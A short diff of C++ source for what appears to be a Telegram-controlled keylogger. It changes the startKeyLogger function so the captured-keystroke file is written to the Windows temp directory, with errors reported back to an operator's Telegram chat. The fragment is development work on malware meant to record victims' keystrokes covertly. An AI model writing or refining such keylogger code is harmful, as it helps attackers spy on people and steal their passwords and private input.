@@ -47,7 +47,11 @@
 void startKeyLogger(const TgBot::Bot& bot_ref, int64_t chat_id) {
     using namespace std;
 
-    ofstream outfile(klFilename, ios::app);
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    string tempFilePath = string(tempPath) + klFileName;
+
+    ofstream outfile(tempFilePath, ios::app);
     if (!outfile) {
         bot_ref.getApi().sendMessage(chat_id, "Cannot open the file.");
         return;
